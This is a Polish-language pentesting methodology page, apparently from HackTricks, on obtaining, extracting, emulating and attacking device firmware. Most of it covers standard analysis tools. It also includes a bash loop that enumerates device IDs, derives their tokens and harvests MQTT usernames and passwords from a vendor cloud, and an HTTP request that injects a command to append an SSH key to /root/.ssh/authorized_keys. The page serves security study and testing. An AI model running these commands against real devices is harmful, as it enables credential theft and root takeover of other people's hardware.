# Analiza firmware

{{#include ../../banners/hacktricks-training.md}}

## **Wprowadzenie**

### Powiązane zasoby


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware to niezbędne oprogramowanie, które pozwala urządzeniom działać poprawnie, zarządzając i ułatwiając komunikację między komponentami sprzętowymi a oprogramowaniem, z którego korzystają użytkownicy. Jest przechowywane w pamięci trwałej, co zapewnia, że urządzenie ma dostęp do krytycznych instrukcji od momentu włączenia, prowadząc do uruchomienia systemu operacyjnego. Badanie i ewentualna modyfikacja firmware to kluczowy krok w identyfikowaniu podatności bezpieczeństwa.

## **Zbieranie informacji**

**Zbieranie informacji** to kluczowy początkowy etap w rozumieniu budowy urządzenia i technologii, które wykorzystuje. Proces ten obejmuje zbieranie danych o:

- architekturze CPU i systemie operacyjnym, na którym działa
- szczegółach bootloadera
- układzie sprzętowym i datasheetach
- metrykach codebase i lokalizacjach źródeł
- zewnętrznych bibliotekach i typach licencji
- historiach aktualizacji i certyfikacjach regulacyjnych
- diagramach architektury i przepływu
- ocenach bezpieczeństwa i zidentyfikowanych lukach

W tym celu narzędzia **open-source intelligence (OSINT)** są nieocenione, podobnie jak analiza dostępnych komponentów open-source przeprowadzana ręcznie i automatycznie. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują darmową analizę statyczną, którą można wykorzystać do znalezienia potencjalnych problemów.

## **Pozyskiwanie firmware**

Pozyskiwanie firmware można przeprowadzić na różne sposoby, każdy o innym stopniu trudności:

- **Bezpośrednio** od źródła (deweloperzy, producenci)
- **Budując** je na podstawie dostarczonych instrukcji
- **Pobierając** z oficjalnych stron wsparcia
- Wykorzystując zapytania **Google dork** do znajdowania hostowanych plików firmware
- Uzyskując dostęp do magazynu w chmurze bezpośrednio, za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- **Przechwytywanie** aktualizacji przy użyciu technik **man-in-the-middle**
- **Extracting** z urządzenia przez połączenia takie jak **UART**, **JTAG** lub **PICit**
- **Sniffing** żądań aktualizacji w komunikacji urządzenia
- Identyfikowanie i użycie **hardcoded update endpoints**
- **Dumping** z bootloadera lub przez sieć
- Usuwanie i odczytywanie układu pamięci, gdy wszystko inne zawiedzie, przy użyciu odpowiednich narzędzi sprzętowych

## Analiza firmware

Teraz, gdy masz firmware, musisz z niego wydobyć informacje, aby wiedzieć, jak je dalej traktować. Różne narzędzia, które możesz do tego użyć:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Jeśli nie znajdziesz dużo przy użyciu tych narzędzi, sprawdź **entropię** obrazu za pomocą `binwalk -E <bin>` — jeżeli entropia jest niska, to prawdopodobnie nie jest zaszyfrowany. Jeśli entropia jest wysoka, prawdopodobnie jest zaszyfrowany (lub w jakiś sposób skompresowany).

Dodatkowo możesz użyć tych narzędzi, aby wyodrębnić **pliki osadzone wewnątrz firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Or [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) to inspect the file.

### Uzyskiwanie systemu plików

Dzięki wcześniejszym wspomnianym narzędziom, takim jak `binwalk -ev <bin>`, powinieneś być w stanie **wyodrębnić system plików**.\
Binwalk zwykle wypakowuje go do **folderu nazwanego według typu systemu plików**, który zazwyczaj jest jednym z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami binwalk **nie będzie miał bajtu magicznego systemu plików w swoich sygnaturach**. W takich przypadkach użyj binwalk, aby **znaleźć offset systemu plików i wyodrębnić skompresowany system plików** z binarki oraz **ręcznie wypakować** system plików zgodnie z jego typem, stosując poniższe kroki.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Uruchom następujące **dd command** carving the Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatywnie można też uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Dla squashfs (używanego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki znajdą się później w katalogu `squashfs-root`.

- Archiwa CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Dla systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- Dla systemów plików ubifs na NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza oprogramowania układowego

Po uzyskaniu oprogramowania układowego ważne jest jego dogłębne zbadanie, aby zrozumieć strukturę i potencjalne podatności. Proces ten obejmuje użycie różnych narzędzi do analizy i wydobycia przydatnych danych z obrazu oprogramowania układowego.

### Narzędzia do analizy wstępnej

Poniżej znajduje się zestaw poleceń do wstępnej inspekcji pliku binarnego (oznaczanego jako `<bin>`). Polecenia te pomagają zidentyfikować typy plików, wyodrębnić stringi, analizować dane binarne oraz zrozumieć szczegóły partycji i systemów plików:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Aby ocenić stan szyfrowania obrazu, sprawdza się **entropy** za pomocą `binwalk -E <bin>`. Niskie entropy sugeruje brak szyfrowania, natomiast wysokie entropy wskazuje na możliwe szyfrowanie lub kompresję.

Do ekstrakcji osadzonych plików zalecane są narzędzia i zasoby takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Używając `binwalk -ev <bin>`, zwykle można wyodrębnić system plików, często do katalogu nazwanego według typu systemu plików (np. squashfs, ubifs). Jednak gdy **binwalk** nie rozpozna typu systemu plików z powodu brakujących magic bytes, konieczna jest ręczna ekstrakcja. Polega to na użyciu `binwalk` do zlokalizowania offsetu systemu plików, a następnie polecenia `dd` do wycięcia systemu plików:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Po tym, w zależności od typu filesystemu (np. squashfs, cpio, jffs2, ubifs), używane są różne polecenia do ręcznego rozpakowania zawartości.

### Filesystem Analysis

Po wyodrębnieniu filesystemu zaczyna się poszukiwanie słabości bezpieczeństwa. Zwraca się uwagę na insecure network daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts oraz skompilowane binaria do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia to:

- **etc/shadow** i **etc/passwd** w poszukiwaniu poświadczeń użytkowników
- Certyfikaty SSL i klucze w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych podatności
- Embedded binaries do dalszej analizy
- Typowe serwery WWW urządzeń IoT i binaria

Kilka narzędzi pomaga w odkrywaniu wrażliwych informacji i podatności w filesystemie:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania wrażliwych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) oraz [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Security Checks on Compiled Binaries

Zarówno source code, jak i skompilowane binaria znalezione w filesystemie muszą być dokładnie sprawdzone pod kątem podatności. Narzędzia takie jak **checksec.sh** dla Unix binaries i **PESecurity** dla Windows binaries pomagają zidentyfikować niechronione binaria, które mogłyby zostać wykorzystane.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Wiele hubów IoT pobiera konfigurację per-device z endpointu w chmurze, który wygląda tak:

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas analizy firmware możesz odkryć, że `<token>` jest generowany lokalnie z deviceId przy użyciu hardcoded secret, na przykład:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Taki projekt pozwala każdemu, kto pozna deviceId i STATIC_KEY, odtworzyć URL i pobrać cloud config, często ujawniając plaintext MQTT credentials i topic prefixes.

Praktyczny przebieg:

1) Wyodrębnij deviceId z UART boot logs

- Podłącz adapter UART 3.3V (TX/RX/GND) i zbierz logi:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Szukaj linii wypisujących wzorzec URL konfiguracji chmury i adres brokera, na przykład:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Wyodrębnij STATIC_KEY i algorytm tokena z firmware

- Załaduj binaria do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wylicz token w Bash i zamień digest na wielkie litery:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Pozyskaj cloud config i MQTT credentials

- Skomponuj URL i pobierz JSON za pomocą curl; sparsuj za pomocą jq, aby wydobyć secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Wykorzystaj plaintext MQTT i słabe topic ACLs (jeśli występują)

- Użyj odzyskanych poświadczeń, aby zasubskrybować tematy serwisowe i wyszukać wrażliwe zdarzenia:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Wyliczanie przewidywalnych identyfikatorów urządzeń (na dużą skalę, z autoryzacją)

- Wiele ekosystemów osadza bajty vendor OUI/product/type, po których następuje sekwencyjny sufiks.
- Możesz iterować potencjalne identyfikatory, wyprowadzać tokeny i programowo pobierać konfiguracje:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notatki
- Zawsze uzyskaj wyraźną autoryzację przed próbą mass enumeration.
- Prefer emulation lub static analysis, aby odzyskać secrets bez modyfikowania docelowego hardware, jeśli to możliwe.


Proces emulating firmware umożliwia **dynamic analysis** zarówno działania urządzenia, jak i pojedynczego programu. To podejście może napotkać problemy związane z zależnościami hardware lub architektury, ale przeniesienie root filesystem lub konkretnych binaries na urządzenie o zgodnej architekturze i endianness, takie jak Raspberry Pi, lub na gotową virtual machine, może ułatwić dalsze testy.

### Emulacja pojedynczych binaries

Do badania pojedynczych programów kluczowe jest określenie endianness i CPU architecture programu.

#### Przykład z MIPS Architecture

Aby emulować MIPS architecture binary, można użyć polecenia:
```bash
file ./squashfs-root/bin/busybox
```
Aby zainstalować niezbędne narzędzia emulacyjne:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Dla MIPS (big-endian) używa się `qemu-mips`, a dla binarek little-endian wybiera się `qemu-mipsel`.

#### Emulacja architektury ARM

Dla binarek ARM proces jest podobny — używa się emulatora `qemu-arm`.

### Pełna emulacja systemu

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne ułatwiają pełną emulację firmware'u, automatyzując proces i wspomagając analizę dynamiczną.

## Dynamiczna analiza w praktyce

Na tym etapie do analizy używa się prawdziwego lub emulowanego środowiska urządzenia. Niezbędne jest utrzymanie dostępu do shella systemu operacyjnego i systemu plików. Emulacja może nie odzwierciedlać w pełni interakcji ze sprzętem, co może wymagać okazjonalnych restartów emulacji. Analiza powinna ponownie obejmować system plików, wykorzystanie ujawnionych stron WWW i usług sieciowych oraz badanie podatności bootloadera. Testy integralności firmware'u są kluczowe do wykrycia potencjalnych backdoorów.

## Techniki analizy w czasie wykonywania

Analiza w czasie wykonywania polega na interakcji z procesem lub binarką w jej środowisku uruchomieniowym, używając narzędzi takich jak gdb-multiarch, Frida i Ghidra do ustawiania breakpointów i identyfikowania podatności przez fuzzing i inne techniki.

## Eksploatacja binarna i Proof-of-Concept

Opracowanie PoC dla wykrytych podatności wymaga dogłębnego zrozumienia docelowej architektury i programowania w językach niskiego poziomu. Mechanizmy ochrony runtime dla binarek w systemach wbudowanych są rzadkie, ale gdy występują, mogą być konieczne techniki takie jak Return Oriented Programming (ROP).

## Gotowe systemy operacyjne do analizy firmware'u

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) dostarczają wstępnie skonfigurowane środowiska do testów bezpieczeństwa firmware'u, wyposażone w niezbędne narzędzia.

## Gotowe OSy do analizy firmware'u

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja mająca pomóc w przeprowadzaniu oceny bezpieczeństwa i penetration testing urządzeń Internet of Things (IoT). Oszczędza dużo czasu, dostarczając wstępnie skonfigurowane środowisko z wszystkimi niezbędnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): System operacyjny do testów bezpieczeństwa embedded oparty na Ubuntu 18.04, wstępnie załadowany narzędziami do testowania bezpieczeństwa firmware'u.

## Ataki downgrade firmware'u & niebezpieczne mechanizmy aktualizacji

Nawet gdy producent wdraża kryptograficzne sprawdzanie podpisu obrazów firmware, **ochrona przed rollbackiem wersji (downgrade) jest często pomijana**. Jeśli bootloader lub recovery-loader weryfikuje tylko podpis za pomocą wbudowanego klucza publicznego, ale nie porównuje *wersji* (lub monotonicznego licznika) obrazu, który ma zostać wgrany, atakujący może legalnie zainstalować **starszy, podatny firmware, który nadal ma ważny podpis**, i w ten sposób ponownie wprowadzić załatane podatności.

Typowy przebieg ataku:

1. **Obtain an older signed image**
   * Pobierz go z publicznego portalu pobierania producenta, CDN lub strony wsparcia.
   * Wydobądź go z towarzyszących aplikacji mobilnych/desktopowych (np. wewnątrz Android APK pod `assets/firmware/`).
   * Pozyskaj go z repozytoriów stron trzecich takich jak VirusTotal, archiwów Internetu, forów itp.
2. **Upload or serve the image to the device** via any exposed update channel:
   * Web UI, mobile-app API, USB, TFTP, MQTT, etc.
   * Wiele konsumenckich urządzeń IoT udostępnia *nieuwierzytelnione* endpointy HTTP(S), które akceptują Base64-encoded firmware blobs, dekodują je po stronie serwera i uruchamiają recovery/upgrade.
3. Po cofnięciu wersji wykorzystaj podatność, która została załatana w nowszym wydaniu (np. command-injection filter dodany później).
4. Opcjonalnie wgraj ponownie najnowszy obraz lub wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu trwałego dostępu.

### Przykład: Command Injection po downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
W podatnym (zdegradowanym) firmware parametr `md5` jest konkatenowany bezpośrednio do polecenia powłoki bez sanitacji, co pozwala na wstrzyknięcie dowolnych poleceń (tutaj — umożliwiając dostęp root za pomocą klucza SSH). Późniejsze wersje firmware wprowadziły podstawowy filtr znaków, jednak brak ochrony przed downgrade sprawia, że poprawka jest bezskuteczna.

### Wyodrębnianie firmware z aplikacji mobilnych

Wielu dostawców pakuje pełne obrazy firmware do swoich aplikacji mobilnych, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi‑Fi. Te pakiety są zwykle przechowywane niezaszyfrowane w APK/APEX pod ścieżkami takimi jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra`, lub nawet zwykły `unzip` pozwalają wydobyć podpisane obrazy bez dostępu do fizycznego sprzętu.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Lista kontrolna do oceny logiki aktualizacji

* Czy transport/uwierzytelnianie *update endpoint* jest odpowiednio zabezpieczone (TLS + uwierzytelnianie)?
* Czy urządzenie porównuje **version numbers** lub **monotonic anti-rollback counter** przed flashowaniem?
* Czy obraz jest weryfikowany w ramach secure boot chain (np. podpisy sprawdzane przez kod ROM)?
* Czy kod userland wykonuje dodatkowe kontrole poprawności (np. allowed partition map, model number)?
* Czy *partial* lub *backup* ścieżki aktualizacji ponownie używają tej samej logiki walidacji?

> 💡  Jeśli któregokolwiek z powyższych brakuje, platforma prawdopodobnie jest podatna na rollback attacks.

## Vulnerable firmware to practice

Aby ćwiczyć odnajdywanie luk w firmware, użyj następujących projektów vulnerable firmware jako punktu wyjścia.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
